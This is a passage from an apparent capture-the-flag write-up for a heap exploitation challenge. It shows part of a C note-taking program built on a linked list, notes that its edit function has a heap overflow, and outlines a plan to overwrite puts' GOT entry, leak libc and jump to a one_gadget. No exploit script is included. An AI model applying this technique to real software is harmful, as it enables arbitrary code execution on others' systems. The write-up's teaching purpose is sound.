</span><span style="color:#d4be98;">    switch (cmd) &#123;
</span><span style="color:#d4be98;">    case 1:
</span><span style="color:#d4be98;">      create();
</span><span style="color:#d4be98;">      break;
</span><span style="color:#d4be98;">    case 2:
</span><span style="color:#d4be98;">      edit();
</span><span style="color:#d4be98;">      break;
</span><span style="color:#d4be98;">    case 3:
</span><span style="color:#d4be98;">      show();
</span><span style="color:#d4be98;">      break;
</span><span style="color:#d4be98;">    case 4:
</span><span style="color:#d4be98;">      puts(&quot;bye!&quot;);
</span><span style="color:#d4be98;">      exit(0);
</span><span style="color:#d4be98;">    default:
</span><span style="color:#d4be98;">      puts(&quot;Invalid command&quot;);
</span><span style="color:#d4be98;">      break;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">    menu();
</span><span style="color:#d4be98;">    printf(&quot;&gt; &quot;);
</span><span style="color:#d4be98;">    cmd = read_int();
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">__attribute__((constructor)) void init() &#123;
</span><span style="color:#d4be98;">  setvbuf(stdin, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">  setvbuf(stdout, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">  alarm(60);
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>And header file was given.</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;err.h&gt;
</span><span style="color:#d4be98;">#include &lt;errno.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;string.h&gt;
</span><span style="color:#d4be98;">#include &lt;unistd.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define CONTENT_SIZE 0x20
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">typedef struct memo &#123;
</span><span style="color:#d4be98;">  struct memo *next;
</span><span style="color:#d4be98;">  char content[CONTENT_SIZE];
</span><span style="color:#d4be98;">&#125; Memo;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">Memo *memo_list = NULL;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">static inline void list_add(Memo *e) &#123;
</span><span style="color:#d4be98;">  if (memo_list == NULL) &#123;
</span><span style="color:#d4be98;">    memo_list = e;
</span><span style="color:#d4be98;">#if DEBUG
</span><span style="color:#d4be98;">    printf(&quot;first entry created at %p\n&quot;, memo_list);
</span><span style="color:#d4be98;">#endif
</span><span style="color:#d4be98;">  &#125; else &#123;
</span><span style="color:#d4be98;">    Memo *tail = memo_list;
</span><span style="color:#d4be98;">    while (tail-&gt;next != NULL)
</span><span style="color:#d4be98;">      tail = tail-&gt;next;
</span><span style="color:#d4be98;">#if DEBUG
</span><span style="color:#d4be98;">    printf(&quot;adding entry to %p-&gt;next\n&quot;, tail);
</span><span style="color:#d4be98;">#endif
</span><span style="color:#d4be98;">    tail-&gt;next = e;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">static inline Memo *list_nth(int index) &#123;
</span><span style="color:#d4be98;">  if (memo_list == NULL)
</span><span style="color:#d4be98;">    return NULL;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  Memo *cur = memo_list;
</span><span style="color:#d4be98;">  int i;
</span><span style="color:#d4be98;">  for (i = 0; i != index &amp;&amp; cur-&gt;next != NULL; ++i, cur = cur-&gt;next)
</span><span style="color:#d4be98;">    ;
</span><span style="color:#d4be98;">  if (i != index)
</span><span style="color:#d4be98;">    return NULL;
</span><span style="color:#d4be98;">  else
</span><span style="color:#d4be98;">    return cur;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>This program is application to take notes which were consists of original linked-list structure.
<code>edit</code> function had heap overflow bug obviously.</p>
<h2>strategy</h2>
<ul>
<li>taking 2 notes.</li>
<li>editing 0 note to overwirte next address of note 1 to GOT(puts).</li>
<li>leaking libc address from contents of note 2.</li>
<li>GOT(puts) overwriting to<code>one gadget</code>by overwriting contents of note 2.</li>
</ul>
